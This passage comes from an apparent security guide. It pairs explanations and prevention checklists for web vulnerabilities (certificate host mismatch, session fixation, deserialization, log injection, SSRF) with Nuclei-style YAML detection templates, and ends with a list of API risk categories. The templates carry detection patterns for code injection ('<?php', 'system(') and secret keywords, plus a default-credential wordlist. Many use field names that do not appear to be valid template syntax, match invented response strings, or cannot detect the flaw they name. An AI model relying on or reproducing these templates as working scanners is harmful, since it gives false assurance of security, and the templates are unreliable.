1. Perform thorough testing: Conduct rigorous testing to ensure that certificate validation is working correctly in your client application. Test scenarios should include cases where certificates have expired, are revoked, or have host mismatches. Automated security testing tools can also help identify potential vulnerabilities.

1. Implement user awareness and education: Educate users about the importance of verifying SSL/TLS certificates and recognizing warning messages related to certificate errors. Encourage users to report any suspicious certificate-related issues.

1. Monitor and log certificate validation errors: Implement logging mechanisms to capture and monitor SSL/TLS certificate validation errors. Monitor logs for any unexpected or suspicious activities related to certificate validation.

1. Regularly update SSL/TLS libraries and frameworks: Keep your SSL/TLS libraries and frameworks up to date with the latest security patches and updates. This ensures that you have the latest fixes for any known vulnerabilities related to certificate validation.

By following these preventive measures, you can mitigate the risk of Improper Validation of Certificate with Host Mismatch and ensure secure SSL/TLS connections in your client applications. Proper certificate validation is crucial for establishing trust and authenticity during secure communications.


```
id: improper-validation-of-certificate-with-host-mismatch
info:
  name: Improper Validation of Certificate with Host Mismatch
  author: Your Name
  severity: high
  description: Detects improper validation of SSL/TLS certificates with host mismatches.
  references:
    - https://example.com
tags:
  - web
  - ssl-tls
  - certificate-validation
requests:
  - name: Certificate Host Mismatch Test
    path:
      - /
      - /admin
      - /dashboard
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: dynamic-attack
        requests:
          - method: GET
            path: /
            insecure: true
            matchers:
              - type: word
                words:
                  - "Certificate host mismatch detected"
```

### Improper Authentication

Improper Authentication is a security vulnerability that occurs when an application fails to properly authenticate and verify the identity of users or entities. This vulnerability allows attackers to bypass authentication mechanisms and gain unauthorized access to sensitive resources or perform actions on behalf of other users.

To prevent Improper Authentication, you should follow these preventive measures:

1. Implement strong authentication mechanisms: Use strong authentication methods, such as multi-factor authentication (MFA), to enhance the security of user authentication. MFA combines multiple factors, such as passwords, biometrics, or hardware tokens, to verify the user's identity.

1. Use secure password policies: Enforce strong password policies that require users to create complex passwords and regularly update them. Encourage the use of unique passwords for each application or service and consider implementing password strength indicators.

1. Protect authentication credentials: Safeguard authentication credentials, such as passwords, tokens, or session IDs, from unauthorized access or disclosure. Use secure storage mechanisms, such as hashing and encryption, to protect sensitive information related to authentication.

1. Implement secure session management: Ensure secure session management practices, such as generating unique session IDs, properly handling session expiration and invalidation, and using secure transport protocols (e.g., HTTPS) to transmit session-related data.

1. Enforce secure login controls: Implement measures to prevent common attacks, such as brute-force attacks and credential stuffing. Enforce account lockouts or introduce CAPTCHA challenges after a certain number of failed login attempts.

1. Implement secure password reset processes: Establish secure password reset processes that require additional verification steps to confirm the user's identity. This may include sending a verification email, asking security questions, or utilizing a secondary authentication factor.

1. Protect against session fixation attacks: Implement measures to prevent session fixation attacks by regenerating session IDs upon successful authentication, avoiding session ID propagation in URLs, and restricting the ability to fixate session IDs.

1. Implement secure account recovery: Establish secure procedures for account recovery to ensure that only authorized users can regain access to their accounts. This may involve verifying the user's identity through a multi-step verification process.

1. Regularly update and patch: Keep the authentication mechanisms, libraries, and frameworks up to date with the latest security patches and updates. Stay informed about any security advisories or vulnerabilities related to the authentication mechanisms used in your application.

1. Conduct security testing: Perform regular security testing, including vulnerability assessments and penetration testing, to identify and remediate any authentication-related vulnerabilities. Test the effectiveness of authentication controls and verify that they cannot be easily bypassed or exploited.

By implementing these preventive measures, you can mitigate the risk of Improper Authentication and strengthen the security of user authentication in your application or system. Robust authentication practices are essential to protect user accounts, sensitive data, and ensure that only authorized individuals can access protected resources.


```
id: improper-authentication-with-host-mismatch
info:
  name: Improper Authentication with Host Mismatch
  author: Your Name
  severity: high
  description: Detects improper authentication mechanisms that allow host mismatches.
  references:
    - https://example.com
tags:
  - web
  - authentication
  - host-mismatch
requests:
  - name: Host Mismatch Authentication Test
    path:
      - /
      - /admin
      - /dashboard
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: dynamic-attack
        payloads:
          - type: wordlist
            words:
              - admin:password
              - user:password
            separator: ":"
        requests:
          - method: POST
            path: /login
            insecure: true
            matchers:
              - type: word
                words:
                  - "Authentication failed: host mismatch detected"
```

### Session Fixation

Session Fixation is a security vulnerability that occurs when an attacker establishes or manipulates a user's session identifier (session ID) to gain unauthorized access to the user's session. The attacker tricks the user into using a known session ID, which the attacker can then use to hijack the session.

To prevent Session Fixation, you should follow these preventive measures:

1. Regenerate session ID upon authentication: Generate a new session ID for the user upon successful authentication. This ensures that the user is assigned a different session ID than the one initially used before authentication.

1. Use a secure random session ID: Generate session IDs using a strong cryptographic random number generator. This helps prevent session ID prediction or brute-force attacks where attackers try to guess valid session IDs.

1. Implement session expiration and inactivity timeouts: Set appropriate session expiration and inactivity timeouts to limit the lifespan of a session. When a session expires or times out, the user needs to reauthenticate, preventing the use of old session IDs by attackers.

1. Implement secure session management: Implement secure session management practices, such as securely transmitting session IDs over encrypted channels (e.g., HTTPS) and avoiding exposing session IDs in URLs.

1. Avoid session ID disclosure: Avoid including session IDs in URLs, logs, or other client-side visible locations. Exposing session IDs increases the risk of session fixation attacks as attackers can easily obtain valid session IDs.

1. Use cookie attributes: Set secure attributes for session cookies, such as the "Secure" flag to ensure they are only transmitted over HTTPS, and the "HttpOnly" flag to prevent client-side scripts from accessing the cookie.

1. Conduct user awareness and education: Educate users about session security best practices, such as the importance of logging out after using shared or public devices and being cautious of session ID manipulation attempts.

1. Implement IP validation: Consider implementing IP validation checks as an additional security measure. Verify that the IP address of the user's requests remains consistent throughout the session. This can help detect and prevent session hijacking attempts.

1. Monitor session activity: Monitor session activity and log events related to session creation, expiration, and invalidation. Monitor for unusual session behavior, such as simultaneous sessions from different locations or devices.

1. Regularly update and patch: Keep your web application and session management components up to date with the latest security patches and updates. Stay informed about any security advisories or vulnerabilities related to session management in your application framework or libraries.

By implementing these preventive measures, you can reduce the risk of Session Fixation and help ensure the integrity and security of user sessions. Secure session management practices are essential to protect user accounts and prevent unauthorized access to sensitive data and functionality.


```
id: session-fixation
info:
  name: Session Fixation
  author: Your Name
  severity: high
  description: Detects vulnerabilities related to session fixation attacks.
  references:
    - https://example.com
tags:
  - web
  - session-fixation
requests:
  - name: Session Fixation Test
    path:
      - /
      - /login
      - /admin
    matchers:
      - type: status
        status:
          - 200
    attacks:
      - type: dynamic-attack
        payloads:
          - type: wordlist
            words:
              - johndoe@example.com
              - janedoe@example.com
          - type: wordlist
            words:
              - 123456
              - password123
        requests:
          - method: GET
            path: /set-session-id
          - method: POST
            path: /login
            insecure: true
            matchers:
              - type: word
                words:
                  - "Session ID mismatch detected"
```


### Inclusion of Functionality from Untrusted Control

Inclusion of Functionality from Untrusted Control, also known as Remote Code Execution (RCE), is a security vulnerability that occurs when an application incorporates and executes code from an untrusted or external source without proper validation or security measures. This vulnerability allows attackers to execute arbitrary code on the target system, potentially leading to unauthorized access, data breaches, or system compromise.

To prevent the Inclusion of Functionality from Untrusted Control, you should follow these preventive measures:

1. Avoid dynamic code execution: Minimize or avoid executing code from untrusted sources whenever possible. Limit the execution of code to trusted and well-defined components within your application.

1. Implement strict input validation: Validate and sanitize all user inputs and external data before using them in dynamic code execution. Apply input validation techniques such as whitelisting, blacklisting, or input filtering to ensure only safe and expected inputs are processed.

1. Use safe alternatives for dynamic code execution: If dynamic code execution is necessary, consider using safe alternatives, such as predefined functions or libraries with built-in security measures. Avoid using functions or features that allow arbitrary code execution or evaluation.

1. Implement strong access controls: Apply strict access controls and permissions to limit the execution of code or the inclusion of functionality to trusted and authorized sources only. Restrict access to critical system resources and prevent unauthorized code execution.

1. Isolate untrusted code: If you need to execute untrusted code, isolate it in a sandboxed or restricted environment with limited privileges. Use technologies like containers or virtual machines to create isolated execution environments.

1. Implement code signing and verification: Digitally sign your code and verify the integrity and authenticity of external components before including or executing them. This helps ensure that the code comes from a trusted source and has not been tampered with.

1. Regularly update and patch: Keep your application, libraries, and frameworks up to date with the latest security patches and updates. Stay informed about any security advisories or vulnerabilities related to the components used in your application.

1. Perform security testing: Conduct regular security testing, including static code analysis, dynamic analysis, and penetration testing, to identify and mitigate vulnerabilities related to the inclusion of untrusted functionality. Test for code injection and RCE vulnerabilities to ensure the application can withstand potential attacks.

1. Implement secure coding practices: Follow secure coding practices, such as input validation, output encoding, and secure configuration management, to minimize the risk of code injection vulnerabilities. Train your development team on secure coding practices to build a robust and secure application.

1. Implement a Web Application Firewall (WAF): Consider using a WAF that can detect and block malicious code injection attempts. WAFs can provide an additional layer of protection by inspecting incoming requests and filtering out potentially dangerous code.

By implementing these preventive measures, you can reduce the risk of Inclusion of Functionality from Untrusted Control and enhance the security of your application. Proper validation, access controls, and secure coding practices are essential to mitigate the risks associated with executing code from untrusted sources.

```
id: untrusted-control-inclusion
info:
  name: Inclusion of Functionality from Untrusted Control
  author: Your Name
  severity: medium
  description: Detects vulnerabilities related to the inclusion of functionality from untrusted sources.
  references:
    - https://example.com
tags:
  - web
  - untrusted-control
requests:
  - name: Inclusion of Untrusted File
    path:
      - /index.php?page=untrusted
      - /admin.php?page=untrusted
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Untrusted Functionality Included"
```


### Download of Code Without Integrity Check


Download of Code Without Integrity Check is a security vulnerability that occurs when code or files are downloaded from a remote source without verifying their integrity. This vulnerability allows attackers to manipulate or replace the downloaded code, leading to potential injection of malicious code or unauthorized modifications.

To prevent Download of Code Without Integrity Check, you should follow these preventive measures:

1. Implement code signing: Digitally sign the code or files you distribute or download. Code signing ensures that the code or files have not been tampered with and come from a trusted source. Verify the digital signatures before executing or using the downloaded code.

1. Use secure and trusted sources: Obtain code or files from trusted and reputable sources. Avoid downloading code or files from untrusted or unknown sources. Trusted sources provide assurance of the integrity and authenticity of the code.

1. Verify checksums or hashes: Provide checksums or hashes (e.g., MD5, SHA-256) for the downloaded code or files. Before using the downloaded content, calculate the checksum or hash of the file and compare it with the provided value. If they match, it indicates that the file has not been altered during the download process.

1. Use secure protocols: Download code or files using secure protocols such as HTTPS, which provides encryption and integrity checks during transmission. Secure protocols help prevent tampering or interception of the downloaded content.

1. Perform file integrity checks: Implement file integrity checks after the download process. This can include comparing the downloaded code or files against a known good version or using file integrity monitoring tools to detect any unauthorized modifications.

1. Regularly update and patch: Keep the software or application that handles the downloading process up to date with the latest security patches and updates. Security vulnerabilities in the download functionality can be addressed through software updates.

1. Implement secure coding practices: Follow secure coding practices when developing the code that handles the download process. Input validation, secure file handling, and secure network communication should be considered to prevent code injection or tampering during the download.

1. Implement strong access controls: Restrict access to the download functionality and ensure that only authorized users or systems can initiate or access the download process. Implement proper authentication and authorization mechanisms to prevent unauthorized downloads.

1. Perform security testing: Conduct regular security testing, including vulnerability scanning and penetration testing, to identify potential weaknesses or vulnerabilities in the download functionality. Test for code injection, tampering, or unauthorized file replacement scenarios.

1. Educate users: Educate users about the importance of downloading code or files from trusted sources and the risks associated with downloading from untrusted or unknown sources. Encourage users to verify the integrity of downloaded files using provided checksums or hashes.

By implementing these preventive measures, you can reduce the risk of Download of Code Without Integrity Check and ensure that the downloaded code or files are trustworthy and have not been tampered with. Verifying integrity, using secure sources, and implementing secure coding practices are critical for maintaining the integrity and security of downloaded code or files.


```
id: download-without-integrity-check
info:
  name: Download of Code Without Integrity Check
  author: Your Name
  severity: high
  description: Detects vulnerabilities related to downloading code without integrity checks.
  references:
    - https://example.com
tags:
  - web
  - download-code
requests:
  - name: Untrusted Code Download
    path:
      - /download.php?file=untrusted
      - /file.php?name=untrusted
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Downloaded code without integrity check"
```


### Deserialization of Untrusted Data

Deserialization of Untrusted Data is a security vulnerability that occurs when untrusted or malicious data is deserialized by an application without proper validation and safeguards. Deserialization vulnerabilities can lead to various attacks, such as remote code execution, injection of malicious objects, or data tampering.

To prevent Deserialization of Untrusted Data, you should follow these preventive measures:

1. Implement input validation: Validate and sanitize all inputs, including serialized data, before deserialization. Apply strict input validation to ensure that only expected and safe data is processed.

1. Use secure deserialization libraries: Utilize secure and trusted deserialization libraries or frameworks that provide built-in protections against common deserialization vulnerabilities. These libraries often include features like input filtering, type checking, or automatic validation.

1. Implement whitelisting: Define and enforce a whitelist of allowed classes or types during deserialization. Restrict the deserialization process to only known and trusted classes, preventing the instantiation of potentially malicious or unexpected objects.

1. Implement integrity checks: Include integrity checks or digital signatures within the serialized data. Verify the integrity of the serialized data before deserialization to ensure that it has not been tampered with or modified.

1. Isolate deserialization functionality: Isolate the deserialization process in a separate and controlled environment. Use mechanisms like sandboxes, containers, or restricted execution environments to mitigate the impact of any potential deserialization vulnerabilities.

1. Enforce strict access controls: Limit access to deserialization functionality to only authorized components or systems. Implement proper authentication and authorization mechanisms to prevent unauthorized deserialization.

1. Implement secure defaults: Configure deserialization settings with secure defaults. Disable or minimize the use of dangerous deserialization features or options that may introduce security risks.

1. Update deserialization libraries: Keep deserialization libraries or frameworks up to date with the latest security patches and updates. Stay informed about any security advisories or vulnerabilities related to the deserialization components used in your application.

1. Perform security testing: Conduct thorough security testing, including static analysis, dynamic analysis, and penetration testing, to identify and remediate deserialization vulnerabilities. Test for deserialization attacks, such as object injection or remote code execution.

1. Educate developers: Provide training and guidance to developers on secure coding practices, emphasizing the importance of proper validation and handling of deserialized data. Encourage developers to follow best practices for secure deserialization.

By implementing these preventive measures, you can mitigate the risk of Deserialization of Untrusted Data and protect your application from potential attacks. Validating inputs, using secure libraries, implementing access controls, and maintaining up-to-date software are essential steps to prevent deserialization vulnerabilities.

```
id: deserialization-untrusted-data
info:
  name: Deserialization of Untrusted Data
  author: Your Name
  severity: high
  description: Detects vulnerabilities related to the deserialization of untrusted data.
  references:
    - https://example.com
tags:
  - web
  - deserialization
requests:
  - name: Untrusted Deserialization
    path:
      - /deserialize.php?data=untrusted
      - /object.php?data=untrusted
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Untrusted deserialization detected"
```


### Insufficient Logging

Insufficient Logging is a security vulnerability that occurs when an application fails to generate or retain sufficient logs to detect and investigate security incidents. Inadequate logging can hinder incident response efforts, making it difficult to identify and analyze security events or suspicious activities.

To prevent Insufficient Logging, you should follow these preventive measures:

1. Implement comprehensive logging: Ensure that your application logs relevant security-related events and activities. Log information such as user authentication attempts, access control failures, critical application actions, input validation errors, and any other security-sensitive events.

1. Include contextual information: Log additional contextual information that can aid in incident investigation, such as user IDs, timestamps, source IP addresses, affected resources, and relevant request/response data. This information can assist in understanding the scope and impact of security incidents.

1. Set appropriate log levels: Define appropriate log levels for different types of events, ranging from debug and informational messages to more critical error and warning logs. Use log levels consistently to capture both routine and exceptional events.

1. Ensure log storage and retention: Set up sufficient storage capacity to retain logs for an adequate period, considering compliance requirements and incident response needs. Retain logs for a timeframe that allows for timely incident detection, response, and forensic analysis.

1. Encrypt and protect logs: Apply encryption mechanisms to protect log files at rest and during transit. Properly configure file permissions and access controls to prevent unauthorized access to log files. Protect log files from tampering or deletion by employing file integrity monitoring or secure log management systems.

1. Monitor log files: Regularly monitor log files for any suspicious or unexpected activities. Implement automated log analysis and intrusion detection systems to detect security events, anomalies, or patterns indicative of potential attacks.

1. Implement centralized log management: Centralize log storage and management in a dedicated log server or security information and event management (SIEM) system. Centralization enables correlation and analysis of logs from multiple sources, improving incident detection and response capabilities.

1. Perform log analysis and reporting: Regularly analyze log data for security insights, trends, or anomalies. Create customized reports or dashboards that provide a summary of important security-related events. Identify areas for improvement or potential security weaknesses based on log analysis results.

1. Implement log integrity checks: Implement mechanisms to detect and alert on any tampering or modification of log files. Use digital signatures, checksums, or secure logging frameworks to ensure the integrity of log data.

1. Regularly review and update logging practices: Continuously review and update your logging practices based on evolving security requirements and industry best practices. Stay informed about emerging threats and logging-related vulnerabilities to ensure your logging mechanisms remain effective.

By implementing these preventive measures, you can enhance your application's logging capabilities, facilitate incident detection and response, and improve your overall security posture. Comprehensive and secure logging practices play a vital role in detecting and investigating security incidents, aiding in timely incident response, and facilitating forensic analysis when necessary.


```
id: insufficient-logging
info:
  name: Insufficient Logging
  author: Your Name
  severity: medium
  description: Detects vulnerabilities related to insufficient logging of security events.
  references:
    - https://example.com
tags:
  - web
  - logging
requests:
  - name: Insufficient Logging
    path:
      - /login
      - /admin
      - /api/v1
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Login failed"
      - type: word
        words:
          - "Unauthorized access"
      - type: word
        words:
          - "Access denied"
```


### Improper Output Neutralization for Logs


Improper Output Neutralization for Logs, also known as Log Injection, is a security vulnerability that occurs when untrusted user input is not properly sanitized or neutralized before being included in log statements. This can lead to log forging, injection of malicious content, or the disclosure of sensitive information within log files.

To prevent Improper Output Neutralization for Logs, you should follow these preventive measures:

1. Apply proper input validation and sanitization: Treat log messages as untrusted user input and validate and sanitize any user-controlled data before including it in log statements. Remove or escape characters that could be interpreted as control characters or log syntax.

1. Use secure logging frameworks: Utilize logging frameworks that provide built-in mechanisms for proper output neutralization. These frameworks often include features like parameterized logging or context-specific escaping, which can help prevent log injection vulnerabilities.

1. Avoid concatenation of untrusted data: Do not concatenate untrusted user input directly into log statements. Instead, use placeholder values or formatting options provided by the logging framework to ensure proper neutralization of user-controlled data.

1. Implement context-specific output encoding: If the logging framework does not provide automatic neutralization mechanisms, implement context-specific output encoding to prevent injection attacks. Use the appropriate encoding technique based on the log format and syntax, such as HTML entity encoding or URL encoding.

1. Limit the verbosity of log messages: Be mindful of the information logged and avoid including sensitive data in log statements. Only log the necessary details required for troubleshooting or auditing purposes, while excluding sensitive information like passwords, Personally Identifiable Information (PII), or authentication tokens.

1. Configure log file permissions: Ensure that log files have appropriate permissions to restrict unauthorized access. Restrict read and write permissions to only authorized users or system processes. Regularly monitor and manage access control settings for log files.

1. Implement centralized log management: Centralize log storage and management in a dedicated log server or a Security Information and Event Management (SIEM) system. Centralization allows for better control, monitoring, and analysis of log data, minimizing the risk of log injection and facilitating detection of suspicious activities.

1. Regularly monitor and review logs: Regularly review log files for any signs of log injection attempts or suspicious log entries. Implement automated log analysis and intrusion detection systems to identify potential log injection attacks or anomalous log patterns.

1. Keep logging frameworks up to date: Keep your logging frameworks and libraries up to date with the latest security patches and updates. Stay informed about any security advisories or vulnerabilities related to the logging components used in your application.

1. Educate developers: Provide training and guidance to developers on secure coding practices for logging. Emphasize the importance of proper input validation, output neutralization, and the risks associated with log injection vulnerabilities.

By implementing these preventive measures, you can mitigate the risk of Improper Output Neutralization for Logs and ensure that your log files remain reliable, accurate, and free from malicious content. Proper input validation, secure logging frameworks, context-specific output encoding, and regular log monitoring are essential steps to prevent log injection vulnerabilities.


```
id: improper-output-neutralization-logs
info:
  name: Improper Output Neutralization for Logs
  author: Your Name
  severity: medium
  description: Detects vulnerabilities related to improper output neutralization in log messages.
  references:
    - https://example.com
tags:
  - web
  - logging
requests:
  - name: Improper Output Neutralization for Logs
    path:
      - /login
      - /admin
      - /api/v1
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{*}}"
      - type: word
        words:
          - "<?php"
      - type: word
        words:
          - "system("
```


### Omission of Security-relevant Information

Omission of Security-relevant Information is a security vulnerability that occurs when an application fails to log or report important security-related events or incidents. This omission can result in a lack of visibility into potential security threats or the inability to detect and respond to security incidents in a timely manner.

To prevent the Omission of Security-relevant Information, you should follow these preventive measures:

1. Identify security-relevant events: Determine the types of security-related events that are crucial for monitoring and detection within your application. This may include failed login attempts, access control failures, suspicious activities, or any other security-related incidents specific to your application and environment.

1. Implement comprehensive logging: Ensure that your application logs all identified security-relevant events. Log the necessary details such as timestamps, user information, affected resources, and relevant context that can assist in incident investigation and response.

1. Set appropriate log levels: Define appropriate log levels for different security events based on their criticality. Use log levels consistently to ensure that security-relevant events are captured and logged accordingly.

1. Implement centralized log management: Centralize log storage and management in a dedicated log server or a Security Information and Event Management (SIEM) system. Centralization allows for better visibility, correlation, and analysis of security events across your application or infrastructure.

1. Regularly review and analyze logs: Establish a routine practice of reviewing and analyzing logs for security events and incidents. Assign responsibility to a designated team or individual to regularly monitor and analyze log data for any potential security threats or anomalies.

1. Implement log retention policies: Define log retention policies that align with your compliance requirements and incident response needs. Retain logs for an appropriate period to ensure that historical data is available for security investigations or forensic analysis.

1. Automate log analysis: Implement automated log analysis tools or intrusion detection systems to assist in the detection of security events or anomalies. Use these tools to monitor log files in real-time and generate alerts or notifications for potential security incidents.

1. Implement real-time monitoring: Use real-time monitoring techniques to actively track and respond to security events as they occur. Implement mechanisms such as log streaming, event triggers, or alerting systems to ensure prompt notifications and response to security incidents.

1. Perform regular security assessments: Conduct regular security assessments and penetration testing to identify any gaps or vulnerabilities in your application's logging and monitoring capabilities. Use the results of these assessments to make necessary improvements and address any security weaknesses.

1. Stay updated with security best practices: Stay informed about the latest security best practices, frameworks, and guidelines related to logging and security monitoring. Regularly update your logging mechanisms and practices to align with industry standards and emerging security threats.

By implementing these preventive measures, you can ensure that security-relevant information is properly logged and reported, enabling effective detection and response to security incidents. Comprehensive and accurate logging practices are essential for maintaining the security of your application and infrastructure, facilitating incident investigations, and supporting compliance requirements.


```
id: omission-security-relevant-info
info:
  name: Omission of Security-relevant Information
  author: Your Name
  severity: high
  description: Detects vulnerabilities related to the omission of security-relevant information in error messages or responses.
  references:
    - https://example.com
tags:
  - web
  - security
requests:
  - name: Omission of Security-relevant Information
    path:
      - /login
      - /admin
      - /api/v1
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Unauthorized"
      - type: word
        words:
          - "Forbidden"
      - type: word
        words:
          - "Access denied"
```

### Sensitive Information into Log File

Sensitive Information into Log File refers to the unintentional logging or inclusion of sensitive data within log files. This can occur when application logs capture and store sensitive information such as passwords, credit card numbers, personally identifiable information (PII), or any other confidential data. Storing sensitive information in log files poses a significant security risk as it increases the potential for unauthorized access, data leakage, and compliance violations.

To prevent the inclusion of sensitive information into log files, consider the following preventive measures:

1. Implement a logging policy: Define a logging policy that explicitly prohibits the logging of sensitive information. Clearly outline what types of data should not be included in log files and educate developers and system administrators about the policy.

1. Apply proper data sanitization: Implement proper data sanitization techniques to prevent sensitive information from being logged inadvertently. Develop a logging framework or use existing libraries that automatically redact or obfuscate sensitive data before logging. Apply techniques such as masking, truncation, or encryption to protect sensitive information.

1. Utilize appropriate log levels: Ensure that sensitive information is not logged at inappropriate log levels. Set log levels in a way that sensitive data is not included in logs intended for debugging, development, or general information purposes. Properly categorize log levels based on the sensitivity of the information being logged.

1. Avoid logging sensitive input parameters: Exercise caution when logging input parameters, especially if they contain sensitive data. If necessary, consider logging only non-sensitive portions of the input data or use a whitelist approach to explicitly exclude sensitive fields from being logged.

1. Implement log filtering: Apply log filtering mechanisms to remove or obfuscate sensitive information from log files. Use regular expressions or predefined patterns to detect and filter out sensitive data before it is stored in log files. Regularly review and update the filtering rules as necessary.

1. Use secure logging storage: Ensure that log files are stored securely with appropriate access controls. Limit access to log files to authorized personnel only. Implement encryption or encryption at rest mechanisms to protect log files from unauthorized access or disclosure.

1. Regularly review log files: Perform regular log file reviews to identify any instances of sensitive information being logged. Implement automated log analysis tools or manual inspection techniques to detect and remediate any inadvertent logging of sensitive data.

1. Pseudonymize or anonymize data: If there is a need to log certain sensitive information for debugging or analysis purposes, consider pseudonymizing or anonymizing the data. Replace actual sensitive values with pseudonyms or anonymized identifiers to protect the privacy and confidentiality of the data.

1. Establish proper access controls: Implement strict access controls for log files, including file permissions and user authentication mechanisms. Only grant access to log files to authorized individuals who require it for operational or security purposes.

1. Train and educate personnel: Provide training and education to developers, system administrators, and other personnel involved in log file management. Raise awareness about the risks associated with logging sensitive information and promote best practices for secure logging.

By implementing these preventive measures, you can reduce the risk of sensitive information being unintentionally logged and stored in log files. Taking proactive steps to protect the confidentiality and integrity of log data helps maintain compliance with data protection regulations, mitigates the risk of data breaches, and preserves the privacy of sensitive information.


```
id: sensitive-info-log-file
info:
  name: Sensitive Information into Log File
  author: Your Name
  severity: high
  description: Detects vulnerabilities related to logging sensitive information into log files.
  references:
    - https://example.com
tags:
  - web
  - security
requests:
  - name: Sensitive Information into Log File
    path:
      - /
    matchers:
      - type: status
        status:
          - 200
    responses:
      - type: word
        words:
          - "password"
          - "credit card"
          - "social security number"
      - type: word
        words:
          - "private key"
          - "API key"
          - "access token"
```



### Server-Side Request Forgery (SSRF)

Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to manipulate the server-side functionality of an application to make arbitrary requests on behalf of the server. The attacker typically exploits this vulnerability to interact with internal resources, perform port scanning, or make requests to other external systems. SSRF attacks can lead to sensitive data exposure, unauthorized access to internal resources, and potential remote code execution.

To prevent Server-Side Request Forgery (SSRF) vulnerabilities, consider the following preventive measures:

1. Input validation and whitelisting: Implement strong input validation and enforce strict whitelisting of allowed URLs or domains. Validate and sanitize user-supplied input, such as URLs or IP addresses, to prevent injection of malicious or unexpected values. Use a whitelist of trusted domains or IP addresses that the server is allowed to communicate with.

1. Restrict network access: Configure network firewalls and security groups to restrict outbound network access from the server. Only allow connections to necessary resources and services, blocking access to internal or sensitive systems that should not be accessed by the server.

1. Use secure protocols and APIs: When making outgoing requests, use secure protocols such as HTTPS to communicate with external systems. Validate the SSL/TLS certificates of the target servers to ensure the integrity and authenticity of the communication. Avoid using insecure or deprecated protocols and APIs that may be vulnerable to SSRF attacks.

1. Isolate server components: Utilize network segmentation and isolate server components to prevent direct access to internal resources. Place servers in separate network segments or subnets, and restrict their access to only necessary resources and services.

1. Configure strong server-side controls: Implement server-side controls to prevent SSRF attacks. This may include implementing allowlists of allowed protocols, ports, and domains, as well as enforcing appropriate security policies at the server level.

1. Implement request validation and filtering: Validate and filter user-supplied URLs and input to ensure they conform to expected patterns and protocols. Consider using security libraries or frameworks that provide built-in protection against SSRF attacks, such as URL validation and sanitization functions.

1. Least privilege principle: Ensure that the server's permissions and privileges are limited to what is necessary for its intended functionality. Avoid running the server with excessive privileges or accessing sensitive resources that are not required for its operation.

1. Secure session management: Implement secure session management practices, including strong session identifiers, session expiration, and secure session storage. This helps prevent attackers from leveraging SSRF vulnerabilities to hijack active sessions or perform unauthorized actions.

1. Regular security updates and patches: Keep server software, libraries, and frameworks up to date with the latest security patches and updates. SSRF vulnerabilities can be present in various components, including web servers, frameworks, or third-party libraries. Regularly monitor and apply security updates to mitigate known vulnerabilities.

1. Perform security testing and code review: Conduct regular security testing, including vulnerability scanning and penetration testing, to identify and remediate SSRF vulnerabilities. Additionally, perform code reviews to identify potential SSRF-prone code patterns and ensure secure coding practices are followed.

By implementing these preventive measures, you can significantly reduce the risk of SSRF vulnerabilities and protect your application from unauthorized access to internal resources and potential data breaches. It is important to adopt a security-first mindset throughout the application development lifecycle and regularly assess and enhance the security posture of your systems.


```
id: ssrf-detection
info:
  name: Server-Side Request Forgery (SSRF) Detection
  author: Your Name
  severity: high
  description: Detects vulnerabilities related to Server-Side Request Forgery (SSRF) attacks.
  references:
    - https://example.com
tags:
  - web
  - security
requests:
  - name: SSRF Detection
    path:
      - /
    matchers:
      - type: status
        status:
          - 200
    match:
      - type: word
        words:
          - "Internal Server Error"
          - "Connection refused"
          - "Invalid URL"
      - type: regex
        part: body
        regex: '(https?|ftp)://[^/]+'
```


## API

### Category: Broken Access Control

Inadequate enforcement of access controls, allowing unauthorized users to access sensitive resources or perform unauthorized actions.
Example of attacks: Accessing restricted data or functionality, privilege escalation, horizontal/vertical privilege escalation.

### Category: Excessive Data Exposure

APIs exposing more data than necessary, potentially leaking sensitive information.
Example of attacks: Exposure of personally identifiable information (PII), financial data, or sensitive business data through API responses.

### Category: Broken Authentication

Flaws in authentication mechanisms that can lead to unauthorized access or account takeover.
Example of attacks: Credential stuffing, session fixation, brute-forcing authentication tokens or passwords.

### Category: Injection Attacks

Lack of proper input validation and sanitization, enabling attackers to inject malicious code or exploit vulnerabilities.
Example of attacks: SQL injection, OS command injection, XML/XXE injection, NoSQL injection.

### Category: Improper Error Handling

APIs revealing excessive or sensitive error details, which can aid attackers in exploiting vulnerabilities.
Example of attacks: Information disclosure, error-based enumeration, bypassing security controls using error messages.

### Category: Security Misconfiguration

Poorly configured API settings, default credentials, or inadequate security configurations.
Example of attacks: Unauthorized access to API endpoints, access to sensitive configuration data, exploitation of default credentials.

### Category: Insecure Direct Object References

Improper access control mechanisms that allow attackers to directly reference internal objects or resources.
Example of attacks: Accessing other users' data, tampering with internal object references, bypassing authorization checks.

### Category: Insufficient Logging and Monitoring

Lack of proper logging and monitoring, hindering the detection and response to security incidents.
Example of attacks: Unauthorized access attempts, API abuse, suspicious activity going unnoticed due to insufficient logging.

### Category: Insecure Serverless Deployments

Security weaknesses in serverless architectures, including issues with configuration, event handling, and access controls.
Example of attacks: Unauthorized execution of serverless functions, sensitive data exposure through serverless configurations.

### Category: Denial of Service (DoS)

Vulnerabilities that can be exploited to overload or disrupt the availability of API services.
Example of attacks: Sending excessive requests, resource exhaustion, API rate limiting bypass, flooding API endpoints.


### Ref

* https://capec.mitre.org/index.html

